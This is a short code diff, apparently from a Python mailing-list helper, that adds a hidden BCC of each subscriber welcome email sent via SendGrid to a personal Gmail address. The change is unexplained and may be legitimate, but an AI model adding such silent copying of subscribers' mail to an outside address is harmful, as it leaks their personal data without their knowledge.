@@ -20,6 +20,9 @@ def add_subscriber(name, email):
         'name': name
     }
     message.template_id = 'd-850c3602148c47ceaad6f16c8167d938'
+    personalization = Personalization()
+    personalization.add_bcc(Email("aupchurch167@gmail.com"))
+    message.add_personalization(personalization)
 
     try:
         sg = SendGridAPIClient(os.environ.get('SENDGRID_API_KEY'))
